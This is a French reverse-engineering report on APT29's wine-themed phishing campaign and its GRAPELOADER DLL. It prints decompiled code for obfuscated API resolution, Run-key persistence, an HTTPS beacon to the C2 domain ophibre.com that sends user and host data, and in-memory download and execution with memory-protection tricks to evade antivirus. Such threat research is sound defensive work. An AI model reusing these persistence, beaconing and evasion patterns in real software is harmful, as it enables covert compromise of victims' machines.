# Rapport Wine -- APT29

Dans ce rapport, je vais parler de la nouvelle version du maliciel utilisé par APT29, Wine.

## Campagne d'hameçonnage

La campagne se déroule comme suit :

- Envoi d'e-mails d'hameçonnage en empruntant l'identité de haut dignitaire européen (agence, institution, ministère, personne), ces e-mails contiennent un lien malveillant qui ressemble au lien du site du ministère/institution/agence qu'ils impersonnent, ce lien va :
    - soit permettre de télécharger une archive contenant les exécutables et DLL malicieux
    - soit directement télécharger un GRAPELOADER (chargeur de DLL d'APT29)

> Le corps de ce mail incite la victime à cliquer sur un lien en se faisant passer pour une invitation à une dégustation de vin (d'où le nom "Wine"), si elle souhaite recevoir plus d'informations. 

- Téléchargement de l'archive ou du GRAPELOADER, contenant trois fichiers :
    - `ppcore.dll` : DLL principale permettant de charger le WINELOADER qui va à son tour installer la backdoor et réaliser un ensemble de tests (anti-vm, anti-débogage, anti-analyse, etc)
    - `AppvIsvSubsystems64.dll` : DLL contenant un ensemble d'opérations de déchiffrement et de chiffrement sans réelle importance (code superflu/code bloating), cependant ce code est nécessaire pour l'exécution de la suite du maliciel
    - `wine.EXE` : exécutable permettant de charger les DLLS


## wine.EXE

Code offusqué qui va charger le *GRAPELOADER*.

## `ppcore.dll` / *GRAPELOADER* 

CCœur du malware, le *GRAPELOADER* va servir à assurer sa persistance dans le système infecté et à charger le *WINELOADER*.

### Offuscation

Avant de décrire les tâches effectuées par ce code, il est important de parler de l'offuscation mise en place. Cette offuscation concerne les chaînes de caractères utilisées par le code pour charger tout un tas de fonctions de l'API Windows (ou d'autres librairies).

Cela donne lieu à 4 fonctions :

- `GetEncryptedDataOf` : Récupère des données chiffrées directement incluses dans le code du maliciel.
- `GetDecrypted`/`DecryptData` : Déchiffre les données récupérées avec la fonction précédente.
- `ResolveFunction` : Permet de résoudre une API à l'aide du nom de la librairie et du nom de la fonction.
- `ErasePointerDestination` : Efface/Met à zéro l'endroit dans la mémoire pointée par le pointeur donné en paramètre.

Ces fonctions sont utilisées dans l'ordre donné ci-dessus, voici comment : 

- Tout d'abord, à l'aide de `GetEncryptedDataOf`, le code récupère la chaîne de caractères chiffrée représentant le nom d'une fonction, d'une librairie (DLL) ou d'une chaîne de caractères classique (chemin, agent utilisateur, type de requête, ...) et la sauvegarde dans une variable. 
- Ensuite, il utilise `GetDecrypted`/`DecryptData` pour déchiffrer la chaîne de caractères récupérée.
- Résous l'API ciblée avec `ResolveFunction`, (nom de la librairie + nom de la fonction), puis appelle la fonction.
- Enfin, le code va effacer la mémoire après l'utilisation de ces chaînes de caractères.

Offuscation facile à contourner à l'aide de la trace, vu qu'il suffit de regarder le retour de la fonction `GetDecrypted`/`DecryptData` afin de comprendre ce qui a été retrouvé.

### Persistance

`ppcore.dll` va assurer la persistance au sein du système à l'aide de la fonction `InstallPersistenceRegKey`. Cette fonction va commencer par copier le contenu de l'archive dans un dossier créé au chemin suivant `C:\Users\User\AppData\Local\` :

```c
/* Création du dossier */
void* name_CreateDirectoryW = GetDecryptedData(EncryptedNameOf_CreateDirectoryW);
void var_5b1;
void var_5b0;
int64_t r9_7 = GetEncryptedDataOf_kernel32_bis(&var_5b1, &var_5b0);
void* name_kernel32;
int64_t r8_8;
name_kernel32 = DecryptData_2(&var_5b0);
ResolveFunction(name_kernel32, name_CreateDirectoryW, r8_8, r9_7)(&path, 0);

...

/**
 * Copie des fichiers / Ce code se répète trois fois.
 * Une pour chaque fichier dans l'archive :
 *  - ppcore.dll
 *  - AppvIsvSubSystems64dll
 *  - wine.EXE
 */
GetEncryptedDataOf_CopyFileW_2(&var_c09, &EncryptedNameOf_CopyFile);
void* name_CopyFileW = GetDecrypted_CopyFileW(EncryptedNameOf_CopyFileW);
void var_c39;
void var_c38;
int64_t r9_17 = GetEncryptedDataOf_kernel32_quad(&var_c39, &EncryptedNameOf_kernel32);
void* name_kernel32;
int64_t r8_27;
name_kernel32 = DecryptData_2(&EncryptedNameOf_kernel32);
int64_t r8_28;
int64_t r9_18;
r8_28 = ResolveFunction(name_kernel32, name_CopyFileW, r8_27, r9_17)(&src, &dest, 0);
```

Une fois ces fichiers copiés, le code va créer une clef de registre (RegKey) et lui attribuer le chemin vers `wine.EXE` afin qu'à chaque redémarrage, l'exécutable se lance. Voici le code :

```c
GetEncryptedDataOf_RegCreateKeyExW(&var_cc1, &EncryptedNameOf_RegCreateKeyExW);
void* name_RegCreateKeyExW = DecryptData_8(EncryptedNameOf_RegCreateKeyExW_1);
void var_cf1;
void var_cf0;
int64_t r9_23 = GetEncryptedDataOf_advapi32(&var_cf1, &DecryptedNameOf_RegCreateKeyExW);
void* name_advapi32_2;
int64_t r8_35;
name_advapi32_2 = DecryptData_2(&var_cf0);
void* RegCreateKeyExW =
    ResolveFunction(name_advapi32_2, name_RegCreateKeyExW, r8_35, r9_23);
/* String for regkey :
 * SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 */
void var_d61;
void var_d60;
GetEncryptedDataOf_string_regkey(&var_d61, &var_d60);
int16_t (* var_10a8_1)[0x107];
(uint32_t)var_10a8_1 = 0;
int64_t var_ca0;
RegCreateKeyExW(-0x7fffffff, GetDecrypted_string_regkey(&var_d60), 0, 0, var_10a8_1, 2, 0, &var_ca0, 0); 
```
Par la suite, à l'aide de la fonction `RegSetKey` il attribue une entrée `POWERPNT` à cette RegKey ainsi que le chemin vers l'exécutable `wine.EXE` (`C:\Users\User\AppData\Local\POWERPNT\wine.EXE`), :

```c
GetEncryptedDataOf_RegSetValueExW(&var_d81, &var_d80);
void* name_RegSetValueExW = DecryptData_5(var_1040_1);
void var_db1;
void var_db0;
int64_t r9_24 = GetEncryptedDataOf_advapi32(&var_db1, &var_db0);
void* name_advapi32;
int64_t r8_36;
name_advapi32 = DecryptData_2(&var_db0);
module_name = name_advapi32;
void* RegSetValueExW;
int64_t rdx_72;
int64_t r8_37;
int64_t r9_25;
RegSetValueExW = ResolveFunction(module_name, name_RegSetValueExW, r8_36, r9_24);
int32_t path_wine_EXE = wcslen(&dest, rdx_72, r8_37, r9_25);
void var_dd9;
void var_dd8;
GetEncryptedDataOf_POWERPNT3(&var_dd9, &var_dd8);
void* name_POWERPNT = DecryptData_6(&var_dd8);
RegSetValueExW(var_ca0, name_POWERPNT, 0, 1, &dest, path_wine_EXE * 2 + 2);
```

Enfin, le code ferme l'accès à la RegKey.

### Connexion au serveur et téléchargement du script

Pour l'instant, le code n'effectue aucune action malveillante. Néanmoins, après avoir installé la persistance, le code va essayer de se connecter à un serveur et de récupérer un script (ou exécutable, n'ayant pas accès au serveur, impossible de savoir).

Tout d'abord, le code retrouve une chaîne d'agent utilisateur (*User Agent String*) chiffrée en mémoire qui est la suivante :

`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36`

Cette chaîne est utilisée afin de récupérer le handle de session pour ouvrir la connexion avec le serveur, il utilise `WinHttpOpen`.

Ensuite, il récupère le nom du serveur qui est `ophibre.com` :

```c
GetEncryptedDataOf_ServerName(&var_1f1, &EncryptedNameOf_server);
void* server_name;
int64_t r8_2;
server_name = DecryptData_4(&EncryptedNameOf_server);
```

Puis récupère le handle de la connexion au serveur en utilisant `WinHttpConnect` avec le handle de session, le nom du serveur et le port :

```c
GetEncryptedDataOf_WinHttpConnect(&var_191, &var_190);
void* name_WinHttpConnect = DecryptData_5(&var_190);
void var_1c1;
void var_1c0;
GetEncryptedDataOf_winhttp_2(&var_1c1, &var_1c0);
void* name_winhttp_2;
int64_t r8_1;
name_winhttp_2 = DecryptData_4(&var_1c0);
void* WinHttpConnect =
    ResolveFunction(name_winhttp_2, name_WinHttpConnect, r8_1, r9);
void var_1f1;
void EncryptedNameOf_server;
GetEncryptedDataOf_ServerName(&var_1f1, &EncryptedNameOf_server);
void* server_name;
int64_t port;
server_name = DecryptData_4(&EncryptedNameOf_server);
(uint16_t)port = 443;
int64_t hConnect;
int64_t r9_1;
hConnect = WinHttpConnect(hSession, server_name, port, 0);
```
Par la suite, il construit une requête `POST` qui a pour but de préparer le téléchargement du script (à voir) :

```c
GetEncryptedDataOf_WinHttpOpenRequest(&var_221, &var_220);
void* name_WinHttpOpenRequest = DecryptData_7(&var_220);
void var_251;
void var_250;
GetEncryptedDataOf_winhttp_3(&var_251, &var_250);
void* name_winhttp_3;
int64_t r8_2;
name_winhttp_3 = DecryptData_4(&var_250);
void* WinHttpOpenRequest = ResolveFunction(name_winhttp_3, name_WinHttpOpenRequest, r8_2, r9_1);
// Target of request blog.php
// ophibre.com/blog.php
void var_279;
void var_278;
GetEncryptedDataOf_blogphp(&var_279, &var_278);
void* name_blogphp = DecryptData_6(&var_278);
void var_299;
void encrypted_POST;
GetEncryptedDataOf_Request_POST(&var_299, &encrypted_POST);
int64_t hRequest;
int64_t r9_2;
hRequest = WinHttpOpenRequest(hConnect, sub_7ffa1bc4ca70(&encrypted_POST), name_blogphp, 0, 0, 0, 0x800000);
```

Il configure la requête HTTP pour ignorer les erreurs SSL/TLS :

```c
int32_t var_2a0 = 0x3300;
...
GetEncryptedDataOf_WinHttpSetOption(&var_2c1, &var_2c0);
void* name_WinHttpSetOption = GetDecryptedData(&var_2c0);
void var_2f1;
void var_2f0;
GetEncryptedDataOf_winhttp_4(&var_2f1, &var_2f0);
void* name_winhttp_4;
int64_t r8_4;
name_winhttp_4 = DecryptData_4(&var_2f0);
ResolveFunction(name_winhttp_4, name_WinHttpSetOption, r8_4, r9_2)(hRequest, 0x1f, &var_2a0, 4);
```
Les flags sont les suivants :

```text
0x3300 = 0x3000 | 0x0200 | 0x0100
       = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
         | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
         | SECURITY_FLAG_IGNORE_UNKNOWN_CA
```

Ensuite, il envoie la requête avec `WinHttpSendRequest` avec des informations suplémentaires (nom de l'utilisateur, de la machine et du processus, et une chaîne de charactère hexadécimal, ainsi que d'autres choses que je n'ai pas trouvées) :

```c
GetEncryptedDataOf_WinHttpSendRequest(&var_319, &var_318);
void* name_WinHttpSendRequest = DecryptData_7(&var_318);
void var_349;
void var_348;
GetEncryptedDataOf_winhttp_5(&var_349, &var_348);
void* name_winhttp_5;
int64_t r8_6;
name_winhttp_5 = DecryptData_4(&var_348);
int32_t var_818 = 0x648;
int64_t success_request = ResolveFunction(name_winhttp_5, name_WinHttpSendRequest, r8_6, r9_3)(hRequest, 0, 0xffffffff, &data_7ffa1bc6ab40, 0x648, 0x648, 0);
```

Puis, il réceptionne la réponse du serveur :

```c
GetEncryptedDataOf_WinHttpReceiveResponse(&var_371, &var_370);
void* name_WinHttpReceiveResponse = DecryptData_9(&var_370);
void var_3a1;
void var_3a0;
GetEncryptedDataOf_winhttp_6(&var_3a1, &var_3a0);
void* name_winhttp_6;
int64_t r8_7;
name_winhttp_6 = DecryptData_4(&var_3a0);
int64_t get_response = ResolveFunction(name_winhttp_6, name_WinHttpReceiveResponse, r8_7, success_request)(hRequest, 0);
```

De cette réponse, il récupère la taille de l'en-tête `Content-Length` (`0x20000005`), qui est la taille en octets du contenu renvoyé par le serveur :

```c
GetEncryptedDataOf_WinHttpQueryHeaders(&var_3d1, &var_3d0);
void* name_WinHttpQueryHeaders = GetDecrypted_WinHttpQueryHeaders(&var_3d0);
void var_401;
void var_400;
sub_7ffa1bc490c0(&var_401, &var_400);
void* name_winhttp_7;
int64_t r8_8;
name_winhttp_7 = DecryptData_4(&var_400);
var_818 = &var_3ac;
int64_t query_success = ResolveFunction(name_winhttp_7, name_WinHttpQueryHeaders, r8_8, get_response)(hRequest, 0x20000005, 0, &size, var_818, 0);
```

Si la taille des données récupérées est supérieure à 0, alors il rentre dans la condition dans laquelle le script va être téléchargé.

Pour récupérer le script, il réutilise `WinHttpQueryHeaders` mais cette fois pour récupérer le code de status HTTP, s'il est égal à `0xc8 == 200`, qui correspond à `OK`, alors le programme continue de s'exécuter :

```c
GetEncryptedDataOf_WinHttpQueryHeaders_2(&var_431, &var_430);
void* name_WinHttpQueryHeaders_2 =
    GetDecrypted_WinHttpQueryHeaders(&var_430);
void var_461;
void var_460;
GetEncryptedDataOf_winhttp_7(&var_461, &var_460);
void* name_winhttp_8;
int64_t r8_9;
name_winhttp_8 = DecryptData_4(&var_460);
var_818 = &var_40c;
ResolveFunction(name_winhttp_8, name_WinHttpQueryHeaders_2, r8_9, query_success)(hRequest, 0x20000013, 0, &var_408, var_818, 0);
```

S'il continue de s'exécuter, alors l'utilisation du script commence. Tout d'abord, il commence par allouer une zone mémoire en lecture/écriture de la taille récupérée dans le dernier `WinHttpQueryHeaders` :

```c
GetEncryptedDataOf_VirtualAlloc(&var_481, &var_480);
void* function_name = DecryptData_10(&var_480);
void var_4b1;
void var_4b0;
int64_t r9_6 = GetEncryptedDataOf_kernel32_2(&var_4b1, &var_4b0);
void* module_name;
int64_t r8_10;
module_name = DecryptData_2(&var_4b0);
void* VirtualAlloc =
    ResolveFunction(module_name, function_name, r8_10, r9_6);
int64_t allocatedSpaceAddress;
int64_t r9_7;
allocatedSpaceAddress = VirtualAlloc(0, (uint64_t)size, 0x3000, 4);
```

Juste après, il lit le contenu de la réponse HTTP et le place dans la zone mémoire nouvellement allouée :

```c
GetEncryptedDataOf_WinHttpReadData(&var_4d9, &var_4d8);
void* name_WinHttpReadData = DecryptData_8(&var_4d8);
void var_509;
void var_508;
GetEncryptedDataOf_winhttp_10(&var_509, &var_508);
void* name_winhttp_9;
int64_t r8_11;
name_winhttp_9 = DecryptData_4(&var_508);
void* WinHttpReadData = ResolveFunction(name_winhttp_9, name_WinHttpReadData, r8_11, r9_7);
int64_t r9_9 = WinHttpReadData(hRequest, *(uint64_t*)allocated_memory_space, (uint64_t)size, &var_4b8); 
```

> On suppose que c'est le contenu de la réponse HTTP est un shellcode/script qui va permettre de charger la dernière DLL.

Après cela, la connexion avec le serveur est fermée à l'aide de `WinHttpCloseHandle`. Et le programme va lancer un nouveau thread dans lequel le script sera lancé.

### Exécution du script

Avant de créer le thread, le programme va tout d'abord modifier les protections de l'espace mémoire où est le script :

```c
GetEncryptedDataOf_NtProtectVirtualMemory(&var_59, &var_58);
void* name_NtProtectVirtualMemory = DecryptData_9(&var_58);
void var_81;
void var_80;
GetEncryptedDataOf_ntdll(&var_81, &var_80);
void* name_ntdll;
int64_t r8_1;
name_ntdll = GetDecrypted_ntdll(&var_80);
int64_t var_350;
void var_34;
ResolveFunction(name_ntdll, name_NtProtectVirtualMemory, r8_1, r9_1)(-1, &payload_base_address, &payload_size, 1, &var_34, var_350);
```

Dans ce code, la protection va être mise à `PAGE_NOACCESS`, cela permet au maliciel d'éviter la détection par Windows Defender's (par exemple). La plupart des antivirus ne regardent pas les pages mémoires avec cette permission. 

La création du thread se déroule comme suit :

```c
GetEncryptedDataOf_CreateThread(&var_a9, &var_a8);
void* name_CreateThread = DecryptData_10(&var_a8);
void var_d9;
void var_d8;
int64_t r9_2 = GetEncryptedDataOf_kernel32_3(&var_d9, &var_d8);
void* name_kernel32;
int64_t r8_3;
name_kernel32 = DecryptData_2(&var_d8);
void* CreateThread = ResolveFunction(name_kernel32, name_CreateThread, r8_3, r9_2);
var_350 = 0;
void* var_358_1;
(uint32_t)var_358_1 = 4;
int64_t hThread = CreateThread(0, 0, allocated_memory_space, 0, var_358_1, 0);
```

Le thread est créé en mode suspendu avec `allocated_memory_space` pointant vers l'adresse du début de l'espace mémoire contenant le script.

Après cela, le programme fait appel, une première fois, à la fonction `Sleep` et cela pendant 10 secondes.

> Cette fonctionnalité est possiblement utilisée pour contrer des analyses basés sur le temps (record de trace sur un certains temps).

Par la suite, la protection de la zone mémoire du script est changé en `PAGE_EXECUTE_READWRITE`

```c
GetEncryptedDataOf_NtProtectVirtualMemory_2(&var_149, &var_148);
void* name_NtProtectVirtualMemory_2 = DecryptData_9(&var_148);
void var_171;
void var_170;
GetEncryptedDataOf_ntdll_2(&var_171, &var_170);
void* name_ntdll_2;
int64_t r8_6;
name_ntdll_2 = GetDecrypted_ntdll(&var_170);
ResolveFunction(name_ntdll_2, name_NtProtectVirtualMemory_2, r8_6,  r9_4)(-1, &payload_base_address, &payload_size, 0x40, &var_34);
```

Suite à cela, le programme fait appel, une seconde fois, à la fonction `Sleep` et cela pendant 10 secondes.

Après cela, le programme fait appel à `ResumeThread` pour lancer le payload récupéré :

```c
GetEncryptedDataOf_ResumeThread(&var_1d9, &var_1d8);
void* name_ResumeThread = DecryptData_10(&var_1d8);
void var_209;
void var_208;
int64_t r9_6 = GetEncryptedDataOf_kernel32_6(&var_209, &var_208);
void* name_kernel32_4;
int64_t r8_9;
name_kernel32_4 = DecryptData_2(&var_208);
ResolveFunction(name_kernel32_4, name_ResumeThread, r8_9, r9_6)(hThread);
```
---

**L'analyse suivante est basée sur l'arbre des processus trouvé dans le rapport d'analyse de *JoeSandbox* : [Rapport d'analyse Windows, vmtools.dll](https://www.joesandbox.com/analysis/1665876/0/html)**

---

Comme énoncé plus tôt, le programme a écrit dans la zone mémoire alloué, où le thread est lancé, un payload qui va être lancé au moment où le thread reprend. Le payload est donc un shellcode qui va servir à chargé petit à petit ce qui est nécessaire pour la dernière DLL. 

Le *Process Tree* donné par l'analyse montre qu'il y a 2 exécutable qui nous intéresse grandement :

- `loaddll64.exe` : Exécutable qui va lancer `rundll32.exe`
- `rundll32.exe` : Exécutable qui va charger/exécuter une DLL


On suppose que le shellcode qui va lancer la commande `loaddll64.exe "C:\Users\user\Desktop\vmtools.dll.dll"` a déjà en mémoire la DLL ainsi que `loaddll64.exe`. Ce shellcode va copier le contenu de `loaddll64.exe` et `vmtools.dll` sur le bureau. Ils vont par la suite être appelé par `loaddll64.exe` et donc `rundll32.exe`.


## `vmtools.dll` / *WINELOADER*

*sha256 : adfe0ef4ef181c4b19437100153e9fe7aed119f5049e5489a36692757460b9f8*

**PAS LE SCRIPT DONC PAS POSSIBLE DE SAVOIR QUE FAIT EXACTEMENT CETTE DLL**